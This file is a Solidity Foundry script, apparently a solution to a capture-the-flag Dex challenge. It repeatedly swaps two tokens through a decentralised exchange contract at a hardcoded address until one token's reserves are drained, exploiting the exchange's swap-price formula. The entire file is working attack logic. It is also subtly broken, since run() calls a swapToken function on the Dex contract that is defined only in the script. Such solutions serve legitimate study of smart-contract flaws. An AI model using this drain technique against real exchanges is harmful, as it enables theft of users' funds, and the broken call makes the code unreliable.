// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import { Script } from "forge-std/script.sol";
import { console } from "forge-std/console.sol";

import { Dex, SwappableToken } from "src/Dex/Dex.sol";

contract DexAttackScript is Script {
    address public dexInstance = address(0x65613E7d893ACeb98120Fd12153ce96fA35d51F2);
    address public token1;
    address public token2;
    function run() public {
        token1 = Dex(dexInstance).token1();
        token2 = Dex(dexInstance).token2();

        vm.startBroadcast();
        bool toggle;
        bool drained;

        while (!drained) {
            toggle ? Dex(dexInstance).swapToken(token1, token2) : Dex(dexInstance).swapToken(token2, token1);
            toggle = !toggle;
            drained = isDexDrained();
        }
        vm.stopBroadcast();        
    }

    function swapToken(address _tokenFrom, address _tokenTo) public {
        require(
            SwappableToken(token1).balanceOf(dexInstance) > 0 && SwappableToken(token2).balanceOf(dexInstance) > 0,
            "Token Drained"
        );
        // get my balance and the exchange balance
        uint256 myTokenBalance = SwappableToken(_tokenFrom).balanceOf(tx.origin);
        uint256 exchangeBalance = SwappableToken(_tokenFrom).balanceOf(dexInstance);

        // determine how much to swap
        uint256 swapAmount;
        myTokenBalance >= exchangeBalance ? swapAmount = exchangeBalance : swapAmount = myTokenBalance;

        SwappableToken(_tokenFrom).approve(tx.origin, dexInstance, swapAmount);
        console.log("DEX TOKEN 1 BALANCE BEFORE:", SwappableToken(token1).balanceOf(dexInstance));
        console.log("DEX TOKEN 2 BALANCE BEFORE:", SwappableToken(token2).balanceOf(dexInstance));
        Dex(dexInstance).swap(_tokenFrom, _tokenTo, swapAmount);
        myTokenBalance = SwappableToken(_tokenFrom).balanceOf(tx.origin);
        console.log("DEX TOKEN 1 BALANCE AFTER:", SwappableToken(token1).balanceOf(dexInstance));
        console.log("DEX TOKEN 2 BALANCE AFTER:", SwappableToken(token2).balanceOf(dexInstance));
    }

    function isDexDrained() public returns (bool) {
        return SwappableToken(token1).balanceOf(dexInstance) == 0 || SwappableToken(token2).balanceOf(dexInstance) == 0;
    }
}